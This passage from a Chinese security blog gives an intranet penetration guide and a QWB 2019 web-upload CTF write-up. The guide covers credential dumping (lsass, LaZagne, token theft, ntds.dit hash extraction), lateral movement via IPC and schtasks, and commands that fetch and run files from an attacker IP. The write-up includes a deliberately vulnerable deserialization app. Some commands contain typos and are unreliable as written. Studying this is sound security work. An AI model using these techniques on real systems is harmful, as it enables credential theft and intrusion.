</code></pre><p><code>windows server 2008</code>及以前的版本,密码是明文存储</p>
<p><img src="/2019/12/03/domain/issa1.png" alt="Ilsass1"><br><code>windows server 12</code>及之后的版本,密码是<code>hash</code>密文</p>
<p><img src="/2019/12/03/domain/issa2.png" alt="lsassa2"></p>
<h3 id="LaZagne"><a href="#LaZagne" class="headerlink" title="LaZagne"></a>LaZagne</h3><p><code>LaZagne</code>可以取各种连接工具密码,浏览器保存的密码等<br><img src="/2019/12/03/domain/lazagne.png" alt="lazagne"></p>
<h3 id="incognito-凭证窃取"><a href="#incognito-凭证窃取" class="headerlink" title="incognito 凭证窃取"></a>incognito 凭证窃取</h3><p>通过<code>tasklist /v</code>查看进程用户,如果有域用户启动的进程,则可以使用<code>incognito</code>进行凭证窃取<br><img src="/2019/12/03/domain/pzqq.png" alt="tasklist"></p>
<p><code>incognito.exe list_tokens -u //查看本机保存的凭证</code><br><img src="/2019/12/03/domain/incognito1.png" alt="incognito1"><br><code>incognito.exe execute -c &quot;HACK\Administrator&quot; cmd.exe</code><br><img src="/2019/12/03/domain/incognito2.png" alt="incognito2"></p>
<h2 id="命令行渗透"><a href="#命令行渗透" class="headerlink" title="命令行渗透"></a>命令行渗透</h2><p>为什么命令行渗透?</p>
<p>1，远程登录桌面增加暴露风睑</p>
<ol>
<li>目标管理员可能对服务器禁用远程登陆。</li>
</ol>
<h3 id="建立-IPC-连接"><a href="#建立-IPC-连接" class="headerlink" title="建立 IPC 连接"></a>建立 IPC 连接</h3><p><code>IPC连接</code>可以访问目标机器的文件(上传、下载),也可以在目标机器上运行命令</p>
<p>建立<code>IPC连接</code><br><code>net use \\target_ip/u:domain\username password</code><br>删除<code>IPC连接</code><br><code>net use \\target_ip/u:domain /de /y</code><br>上传和下载文件直接通过 copy 命令就可以,不过路径换成 UNC 路径,</p>
<p>何为 UNC 路径?简单来讲以\开头的路径就是 UNC 路径</p>
<p>上传文件:</p>
<p><code>copy file \\target_ip\path$</code></p>
<p>下载文件:</p>
<p><code>copy \\target_ip\path$\</code></p>
<p>查看<code>dir</code>目录下的文件</p>
<p><code>dir \\target_ip\path$\</code></p>
<p>执行命令(明文|hash 传递)</p>
<p><code>schtasks (计划任务)</code></p>
<p>创建:</p>
<p><code>schtasks create /tn taskname /u域\域用户 /p 域用户密码 /tr 执行的命令或者bat路径 /sc ONSTART /s 域主机IP /RU system</code></p>
<p>运行:</p>
<p><code>schtasks /run /tn taskname /s 域主机IP /u 域\域用户 /p 域用户密码</code></p>
<p>删除:</p>
<p><code>schtasks /F /delete /tn taskname /s 域主机IP /U 域\域用户 /p 域用户密码</code></p>
<h3 id="paEXEC"><a href="#paEXEC" class="headerlink" title="paEXEC"></a>paEXEC</h3><p>待续</p>
<h2 id="命令行下载文件"><a href="#命令行下载文件" class="headerlink" title="命令行下载文件"></a>命令行下载文件</h2><h3 id="powershell-win2003-xp-不支持"><a href="#powershell-win2003-xp-不支持" class="headerlink" title="powershell (win2003 xp 不支持)"></a>powershell (win2003 xp 不支持)</h3><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">powershell -exec bypass -c (new-object System.<span class="built_in">Net</span>.WebClient).Down1oadFile('http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">101</span>/test.txt','C:\test.txt')</span><br></pre></td></tr></table></figure>
<h3 id="Certutil"><a href="#Certutil" class="headerlink" title="Certutil"></a>Certutil</h3><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">Certutil.exe -urlcache -split -f http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span>/test.txt file.txt</span><br></pre></td></tr></table></figure>
<h3 id="bitasdmin"><a href="#bitasdmin" class="headerlink" title="bitasdmin"></a>bitasdmin</h3><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">bitsadmin /rawreturn /transfer getfile http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">1</span>/test.txt E:\file\test.txt</span><br><span class="line">bitsadmin /rawreturn /transfer getpayload http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">1</span>/test.txt E:\file\test.txt</span><br></pre></td></tr></table></figure>
<h3 id="msiexeC"><a href="#msiexeC" class="headerlink" title="msiexeC"></a>msiexeC</h3><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">msiexec /q /j http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span>/test.txt</span><br></pre></td></tr></table></figure>
<h3 id="IEExec"><a href="#IEExec" class="headerlink" title="IEExec"></a>IEExec</h3><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Windows</span>\<span class="title">Microsoft.NET</span>\<span class="title">Framework</span>\<span class="title">v2</span>.0.50727&gt;<span class="title">caspol</span> -<span class="title">s</span> <span class="title">off</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">windows</span>\<span class="title">Microsoft.NET</span>\<span class="title">Framework</span>\<span class="title">v2</span>.0.50727&gt;<span class="title">IEExec.exe</span> <span class="title">http</span>://192.168.1.1/<span class="title">test.exe</span></span></span><br></pre></td></tr></table></figure>
<h2 id="内网代理"><a href="#内网代理" class="headerlink" title="内网代理"></a>内网代理</h2><p>内网有些资源可能需要挂指定代理才可以访问,代理地址可以通过读取注册表获取,直接查询 HKEY_CURRENT_USER</p>
<p>1.ie 代理</p>
<figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">req query "HKEY_CURRENT_USER\Software\Microsoft\windows\CurrentVersion\Internet Settings /v ProxyServer"</span><br></pre></td></tr></table></figure>
<p><img src="/2019/12/03/domain/dl_ie.png" alt="dlie"><br>2.pac 代理</p>
<figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">req query HKEY_CURRENT_USER\Software\Microsoft\windows\CurrentVersion\Internet Settings /v AutoConfigURL"</span><br></pre></td></tr></table></figure>
<p><img src="/2019/12/03/domain/dl_pac.png" alt="dlpac"></p>
<h2 id="windows-api"><a href="#windows-api" class="headerlink" title="windows api"></a>windows api</h2><p>工具利用前提:建立<code>IPC</code>连接</p>
<p>相关工具</p>
<p><code>etGroupGetUser.exe</code> 查询域中各个组的成员,<code>IP</code>必须是<code>域控IP</code>，<code>域用户</code>随意。<br><img src="/2019/12/03/domain/api1.png" alt="api1"></p>
<p><code>NetGroupGetMembers.exe</code> 查询目标服务器本地管理组的成员<br><img src="/2019/12/03/domain/api2.png" alt="api2"></p>
<p><code>NetUserEnum.exe</code> 查询目标服务器中所有用户,包括隐藏用户<br><img src="/2019/12/03/domain/api3.png" alt="api3"></p>
<h2 id="导域-hash"><a href="#导域-hash" class="headerlink" title="导域 hash"></a>导域 hash</h2><p><code>windows</code>的密码是经过<code>hash</code>后存储的,本地存在<code>HKLM\sam</code>,<code>HKLM\system</code>注册表中,域里面存在域控制器的<code>c:\windows\ntds\ntds.dit</code>中<br><code>ntds.dit</code>其实就是个<code>esent</code>数据库,微软本身就有一系列的 API 能够操作这个数据库。可以利用快照导出<code>ntds.dit</code>.</p>
<p>创建快照:</p>
<p><code>ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit</code></p>
<p><img src="/2019/12/03/domain/kz_create.png" alt="kz_create"></p>
<p>挂载快照:<br><code>ntdsutil snapshot &quot;mount {id} quit quit&quot;</code><br><img src="/2019/12/03/domain/kz_mount.png" alt="KZ_MOUNT"></p>
<p>复制<code>ntds.dit</code>:</p>
<p><code>copy C:\$SNAP xxxxxx VOLUMEC$\windows\NTDS\ntds.dit path</code></p>
<p><img src="/2019/12/03/domain/copy_dit.png" alt="copy_dit"></p>
<p>卸载快照<br><code>ntdsutil snapshot &quot;unmount {id} quit quit&quot;</code><br><img src="/2019/12/03/domain/kz_unmount.png" alt="kz_unmount"></p>
<p>删除快照<br><code>ntdsutil snapshot &quot;delete {id} quit quit&quot;</code><br><img src="/2019/12/03/domain/kz_delete.png" alt="kz_delete"></p>
<p>获取解密秘钥<code>KEY</code><br><code>reg save HKLM\SYSTEM\ path</code><br><img src="/2019/12/03/domain/get_key.png" alt="get_key"></p>
<p>使用<code>NTDSDumpEx</code>获取所有域用户的<code>hash</code><br><code>NTDSDumpEx.exe -d ntds.dit -o hash.txt -s keypath</code></p>
<p><img src="/2019/12/03/domain/ntdsdumpex.png" alt="NTDSDumpEx"></p>
<p><img src="/2019/12/03/domain/ntds_res.png" alt="ntds_res"></p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
        <tag>域</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>强网杯2019-web-upload</title>
    <url>/2019/11/29/qwb-upload/</url>
    <content><![CDATA[<h1 id="第三届强网杯-WEB-Upload-WriteUp"><a href="#第三届强网杯-WEB-Upload-WriteUp" class="headerlink" title="第三届强网杯 WEB-Upload WriteUp"></a>第三届强网杯 WEB-Upload WriteUp</h1><p>这一题主要考察了代码审计+反序列化过程的理解</p>
<h2 id="Part-1"><a href="#Part-1" class="headerlink" title="Part 1"></a>Part 1</h2><p>打开题目是个登录框<br><img src="/2019/11/29/qwb-upload/login.png" alt="login"></p>
<p>由于题目名字是<code>upload</code>先随便注册个账号登录看看,发现有一个上传点,<br><img src="/2019/11/29/qwb-upload/index.png" alt="index"></p>
<p>用<code>蚁剑</code>生成<code>shell</code>,加上<code>GIF89a</code>文件头上传<br><img src="/2019/11/29/qwb-upload/up.png" alt="up"></p>
<p>可以看到这里的<code>cookie</code>是一串<code>base64</code>,<code>decode</code>一下<br><img src="/2019/11/29/qwb-upload/cookie.png" alt="cookie"></p>
<p>这是<code>PHP</code>对象序列化后的字符串,其中还包括了刚刚上传的图片的路径,可以看到图片被重命名为<code>MD5.png</code>的格式,</p>
<h2 id="Part-2-代码审计"><a href="#Part-2-代码审计" class="headerlink" title="Part 2 代码审计"></a>Part 2 代码审计</h2><p>反序列化需要源码的可以根据提示直接访问<code>\www.tar.gz</code>拿到<br>看了看比较关键的文件源码</p>
<p><code>application\web\controller\Index.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $profile;</span><br><span class="line">    <span class="keyword">public</span> $profile_db;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;login_check())&#123;</span><br><span class="line">            $curr_url=<span class="string">"http://"</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].$_SERVER[<span class="string">'SCRIPT_NAME'</span>].<span class="string">"/home"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;fetch(<span class="string">"index"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">home</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;login_check())&#123;</span><br><span class="line">            $curr_url=<span class="string">"http://"</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].$_SERVER[<span class="string">'SCRIPT_NAME'</span>].<span class="string">"/index"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;check_upload_img())&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;assign(<span class="string">"username"</span>,<span class="keyword">$this</span>-&gt;profile_db[<span class="string">'username'</span>]);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;fetch(<span class="string">"upload"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;assign(<span class="string">"img"</span>,<span class="keyword">$this</span>-&gt;profile_db[<span class="string">'img'</span>]);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;assign(<span class="string">"username"</span>,<span class="keyword">$this</span>-&gt;profile_db[<span class="string">'username'</span>]);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;fetch(<span class="string">"home"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login_check</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $profile=cookie(<span class="string">'user'</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($profile))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;profile=unserialize(base64_decode($profile));</span><br><span class="line">            <span class="keyword">$this</span>-&gt;profile_db=db(<span class="string">'user'</span>)-&gt;where(<span class="string">"ID"</span>,intval(<span class="keyword">$this</span>-&gt;profile[<span class="string">'ID'</span>]))-&gt;find();</span><br><span class="line">            <span class="keyword">if</span>(array_diff(<span class="keyword">$this</span>-&gt;profile_db,<span class="keyword">$this</span>-&gt;profile)==<span class="keyword">null</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check_upload_img</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;profile) &amp;&amp; !<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;profile_db))&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;profile_db[<span class="string">'img'</span>]))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">logout</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cookie(<span class="string">"user"</span>,<span class="keyword">null</span>);</span><br><span class="line">        $curr_url=<span class="string">"http://"</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].$_SERVER[<span class="string">'SCRIPT_NAME'</span>].<span class="string">"/index"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">`application\web\controller\Login.php`</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">````php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Login</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker=<span class="keyword">new</span> Index();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;checker)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;checker-&gt;login_check())&#123;</span><br><span class="line">                $curr_url=<span class="string">"http://"</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].$_SERVER[<span class="string">'SCRIPT_NAME'</span>].<span class="string">"/home"</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(input(<span class="string">"?post.email"</span>) &amp;&amp; input(<span class="string">"?post.password"</span>))&#123;</span><br><span class="line">            $email=input(<span class="string">"post.email"</span>,<span class="string">""</span>,<span class="string">"addslashes"</span>);</span><br><span class="line">            $password=input(<span class="string">"post.password"</span>,<span class="string">""</span>,<span class="string">"addslashes"</span>);</span><br><span class="line">            $user_info=db(<span class="string">"user"</span>)-&gt;where(<span class="string">"email"</span>,$email)-&gt;find();</span><br><span class="line">            <span class="keyword">if</span>($user_info) &#123;</span><br><span class="line">                <span class="keyword">if</span> (md5($password) === $user_info[<span class="string">'password'</span>]) &#123;</span><br><span class="line">                    $cookie_data=base64_encode(serialize($user_info));</span><br><span class="line">                    cookie(<span class="string">"user"</span>,$cookie_data,<span class="number">3600</span>);</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;success(<span class="string">'Login successful!'</span>, url(<span class="string">'../home'</span>));</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;error(<span class="string">'Login failed!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;error(<span class="string">'email not registed!'</span>,url(<span class="string">'../index'</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error(<span class="string">'email or password is null!'</span>,url(<span class="string">'../index'</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>application\web\controller\Register.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $registed;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker=<span class="keyword">new</span> Index();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;checker) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;checker-&gt;login_check())&#123;</span><br><span class="line">                $curr_url=<span class="string">"http://"</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].$_SERVER[<span class="string">'SCRIPT_NAME'</span>].<span class="string">"/home"</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(input(<span class="string">"post.username"</span>)) &amp;&amp; !<span class="keyword">empty</span>(input(<span class="string">"post.email"</span>)) &amp;&amp; !<span class="keyword">empty</span>(input(<span class="string">"post.password"</span>))) &#123;</span><br><span class="line">            $email = input(<span class="string">"post.email"</span>, <span class="string">""</span>, <span class="string">"addslashes"</span>);</span><br><span class="line">            $password = input(<span class="string">"post.password"</span>, <span class="string">""</span>, <span class="string">"addslashes"</span>);</span><br><span class="line">            $username = input(<span class="string">"post.username"</span>, <span class="string">""</span>, <span class="string">"addslashes"</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;check_email($email)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">empty</span>(db(<span class="string">"user"</span>)-&gt;where(<span class="string">"username"</span>, $username)-&gt;find()) &amp;&amp; <span class="keyword">empty</span>(db(<span class="string">"user"</span>)-&gt;where(<span class="string">"email"</span>, $email)-&gt;find())) &#123;</span><br><span class="line">                    $user_info = [<span class="string">"email"</span> =&gt; $email, <span class="string">"password"</span> =&gt; md5($password), <span class="string">"username"</span> =&gt; $username];</span><br><span class="line">                    <span class="keyword">if</span> (db(<span class="string">"user"</span>)-&gt;insert($user_info)) &#123;</span><br><span class="line">                        <span class="keyword">$this</span>-&gt;registed = <span class="number">1</span>;</span><br><span class="line">                        <span class="keyword">$this</span>-&gt;success(<span class="string">'Registed successful!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">$this</span>-&gt;error(<span class="string">'Registed failed!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;error(<span class="string">'Account already exists!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;error(<span class="string">'Email illegal!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error(<span class="string">'Something empty!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check_email</span><span class="params">($email)</span></span>&#123;</span><br><span class="line">        $pattern = <span class="string">"/^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]&#123;2,&#125;)$/"</span>;</span><br><span class="line">        preg_match($pattern, $email, $matches);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($matches))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;registed)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checker-&gt;index();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>application\web\controller\Profile.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $filename_tmp;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $upload_menu;</span><br><span class="line">    <span class="keyword">public</span> $ext;</span><br><span class="line">    <span class="keyword">public</span> $img;</span><br><span class="line">    <span class="keyword">public</span> $except;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker=<span class="keyword">new</span> Index();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;upload_menu=md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">        @chdir(<span class="string">"../public/upload"</span>);</span><br><span class="line">        <span class="keyword">if</span>(!is_dir(<span class="keyword">$this</span>-&gt;upload_menu))&#123;</span><br><span class="line">            @mkdir(<span class="keyword">$this</span>-&gt;upload_menu);</span><br><span class="line">        &#125;</span><br><span class="line">        @chdir(<span class="keyword">$this</span>-&gt;upload_menu);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_img</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;checker)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;checker-&gt;login_check())&#123;</span><br><span class="line">                $curr_url=<span class="string">"http://"</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].$_SERVER[<span class="string">'SCRIPT_NAME'</span>].<span class="string">"/index"</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename_tmp=$_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename=md5($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]).<span class="string">".png"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ext_check();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ext) &#123;</span><br><span class="line">            <span class="keyword">if</span>(getimagesize(<span class="keyword">$this</span>-&gt;filename_tmp)) &#123;</span><br><span class="line">                @copy(<span class="keyword">$this</span>-&gt;filename_tmp, <span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">                @unlink(<span class="keyword">$this</span>-&gt;filename_tmp);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;img=<span class="string">"../upload/$this-&gt;upload_menu/$this-&gt;filename"</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;update_img();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;error(<span class="string">'Forbidden type!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error(<span class="string">'Unknow file type!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_img</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $user_info=db(<span class="string">'user'</span>)-&gt;where(<span class="string">"ID"</span>,<span class="keyword">$this</span>-&gt;checker-&gt;profile[<span class="string">'ID'</span>])-&gt;find();</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($user_info[<span class="string">'img'</span>]) &amp;&amp; <span class="keyword">$this</span>-&gt;img)&#123;</span><br><span class="line">            <span class="keyword">if</span>(db(<span class="string">'user'</span>)-&gt;where(<span class="string">'ID'</span>,$user_info[<span 